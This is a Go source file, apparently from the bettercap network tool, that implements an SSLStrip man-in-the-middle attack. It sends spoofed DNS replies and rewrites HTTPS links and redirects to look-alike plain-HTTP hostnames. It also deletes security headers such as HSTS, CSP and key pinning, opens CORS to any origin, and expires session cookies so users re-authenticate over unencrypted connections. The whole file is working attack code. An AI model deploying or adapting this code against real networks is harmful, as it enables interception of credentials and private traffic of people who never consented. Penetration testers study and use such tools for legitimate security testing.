package http_proxy

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/elazarl/goproxy"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/evilsocket/islazy/tui"
)

var (
	maxRedirs        = 5
	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
	subdomains       = map[string]string{
		"www":     "wwwww",
		"webmail": "wwebmail",
		"mail":    "wmail",
		"m":       "wmobile",
	}
)

type SSLStripper struct {
	enabled       bool
	session       *session.Session
	cookies       *CookieTracker
	hosts         *HostTracker
	handle        *pcap.Handle
	pktSourceChan chan gopacket.Packet
	redirs        map[string]int
}

func NewSSLStripper(s *session.Session, enabled bool) *SSLStripper {
	strip := &SSLStripper{
		enabled: false,
		cookies: NewCookieTracker(),
		hosts:   NewHostTracker(),
		session: s,
		handle:  nil,
		redirs:  make(map[string]int),
	}
	strip.Enable(enabled)
	return strip
}

func (s *SSLStripper) Enabled() bool {
	return s.enabled
}

func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {
	redir := fmt.Sprintf("(->%s)", address)
	who := target.String()

	if t, found := s.session.Lan.Get(target.String()); found {
		who = t.String()
	}

	log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", tui.Green("dns"), tui.Red(domain), tui.Dim(redir), tui.Bold(who))

	var err error
	var src, dst net.IP

	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		log.Debug("Missing network layer skipping packet.")
		return
	}

	pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	src = pip.DstIP
	dst = pip.SrcIP

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv4,
	}

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	ip4 := layers.IPv4{
		Protocol: layers.IPProtocolUDP,
		Version:  4,
		TTL:      64,
		SrcIP:    src,
		DstIP:    dst,
	}

	udp := layers.UDP{
		SrcPort: pudp.DstPort,
		DstPort: pudp.SrcPort,
	}

	udp.SetNetworkLayerForChecksum(&ip4)

	var raw []byte
	err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)
	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
		udp := typeUDP.(*layers.UDP)
		for _, q := range dns.Questions {
			domain := string(q.Name)
			original := s.hosts.Unstrip(domain)
			if original != nil && original.Address != nil {
				s.dnsReply(pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
			}
		}
	}
}

func (s *SSLStripper) Enable(enabled bool) {
	s.enabled = enabled

	if enabled && s.handle == nil {
		var err error

		if s.handle, err = pcap.OpenLive(s.session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
			panic(err)
		}

		if err = s.handle.SetBPFFilter("udp"); err != nil {
			panic(err)
		}

		go func() {
			defer func() {
				s.handle.Close()
				s.handle = nil
			}()

			for s.enabled {
				src := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
				s.pktSourceChan = src.Packets()
				for packet := range s.pktSourceChan {
					if !s.enabled {
						break
					}

					s.onPacket(packet)
				}
			}
		}()
	}
}

func (s *SSLStripper) isContentStrippable(res *http.Response) bool {
	for name, values := range res.Header {
		for _, value := range values {
			if name == "Content-Type" {
				return strings.HasPrefix(value, "text/") || strings.Contains(value, "javascript")
			}
		}
	}

	return false
}

func (s *SSLStripper) processURL(url string) string {
	// first we remove the https schema
	url = strings.Replace(url, "https://", "http://", 1)

	// search for a known subdomain and replace it
	found := false
	for sub, repl := range subdomains {
		what := fmt.Sprintf("://%s", sub)
		with := fmt.Sprintf("://%s", repl)
		if strings.Contains(url, what) {
			url = strings.Replace(url, what, with, 1)
			found = true
			break
		}
	}
	// fallback
	if !found {
		url = strings.Replace(url, "://", "://wwww.", 1)
	}

	return url
}

// sslstrip preprocessing, takes care of:
//
// - handling stripped domains
// - making unknown session cookies expire
func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
	if !s.enabled {
		return
	}

	// well ...
	if req.URL.Scheme == "https" {
		// TODO: check for max redirects?
		req.URL.Scheme = "http"
	}

	// handle stripped domains
	original := s.hosts.Unstrip(req.Host)
	if original != nil {
		log.Info("[%s] Replacing host %s with %s in request from %s", tui.Green("sslstrip"), tui.Bold(req.Host), tui.Yellow(original.Hostname), req.RemoteAddr)
		req.Host = original.Hostname
		req.URL.Host = original.Hostname
		req.Header.Set("Host", original.Hostname)
	}

	if !s.cookies.IsClean(req) {
		// check if we need to redirect the user in order
		// to make unknown session cookies expire
		log.Info("[%s] Sending expired cookies for %s to %s", tui.Green("sslstrip"), tui.Yellow(req.Host), req.RemoteAddr)
		s.cookies.Track(req)
		redir = s.cookies.Expire(req)
	}

	return
}

func (s *SSLStripper) isMaxRedirs(hostname string) bool {
	// did we already track redirections for this host?
	if nredirs, found := s.redirs[hostname]; found {
		// reached the threshold?
		if nredirs >= maxRedirs {
			log.Warning("[%s] Hit max redirections for %s, serving HTTPS.", tui.Green("sslstrip"), hostname)
			// reset
			delete(s.redirs, hostname)
			return true
		} else {
			// increment
			s.redirs[hostname]++
		}
	} else {
		// start tracking redirections
		s.redirs[hostname] = 1
	}
	return false
}

func (s *SSLStripper) fixResponseHeaders(res *http.Response) {
	res.Header.Del("Content-Security-Policy-Report-Only")
	res.Header.Del("Content-Security-Policy")
	res.Header.Del("Strict-Transport-Security")
	res.Header.Del("Public-Key-Pins")
	res.Header.Del("Public-Key-Pins-Report-Only")
	res.Header.Del("X-Frame-Options")
	res.Header.Del("X-Content-Type-Options")
	res.Header.Del("X-WebKit-CSP")
	res.Header.Del("X-Content-Security-Policy")
	res.Header.Del("X-Download-Options")
	res.Header.Del("X-Permitted-Cross-Domain-Policies")
	res.Header.Del("X-Xss-Protection")
	res.Header.Set("Allow-Access-From-Same-Origin", "*")
	res.Header.Set("Access-Control-Allow-Origin", "*")
	res.Header.Set("Access-Control-Allow-Methods", "*")
	res.Header.Set("Access-Control-Allow-Headers", "*")
}

func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
	if !s.enabled {
		return
	}

	s.fixResponseHeaders(res)

	// is the server redirecting us?
	if res.StatusCode != 200 {
		// extract Location header
		if location, err := res.Location(); location != nil && err == nil {
			orig := res.Request.URL
			origHost := orig.Hostname()
			newHost := location.Host
			newURL := location.String()

			// are we getting redirected from http to https?
			if orig.Scheme == "http" && location.Scheme == "https" {

				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))

				// if we still did not reach max redirections, strip the URL down to
				// an alternative HTTP version
				if !s.isMaxRedirs(origHost) {
					strippedURL := s.processURL(newURL)
					u, _ := url.Parse(strippedURL)
					hostStripped := u.Hostname()

					s.hosts.Track(origHost, hostStripped)

					res.Header.Set("Location", strippedURL)
				}
			}
		}
	}

	// if we have a text or html content type, fetch the body
	// and perform sslstripping
	if s.isContentStrippable(res) {
		raw, err := ioutil.ReadAll(res.Body)
		if err != nil {
			log.Error("Could not read response body: %s", err)
			return
		}

		body := string(raw)
		urls := make(map[string]string)
		matches := httpsLinksParser.FindAllString(body, -1)
		for _, u := range matches {
			// make sure we only strip stuff we're able to
			// resolve and process
			if strings.ContainsRune(u, '.') {
				urls[u] = s.processURL(u)
			}
		}

		nurls := len(urls)
		if nurls > 0 {
			plural := "s"
			if nurls == 1 {
				plural = ""
			}
			log.Info("[%s] Stripping %d SSL link%s from %s", tui.Green("sslstrip"), nurls, plural, tui.Bold(res.Request.Host))
		}

		for url, stripped := range urls {
			log.Debug("Stripping url %s to %s", tui.Bold(url), tui.Yellow(stripped))

			body = strings.Replace(body, url, stripped, -1)

			hostOriginal := strings.Replace(url, "https://", "", 1)
			hostStripped := strings.Replace(stripped, "http://", "", 1)
			s.hosts.Track(hostOriginal, hostStripped)
		}

		// reset the response body to the original unread state
		// but with just a string reader, this way further calls
		// to ioutil.ReadAll(res.Body) will just return the content
		// we stripped without downloading anything again.
		res.Body = ioutil.NopCloser(strings.NewReader(body))
	}
}
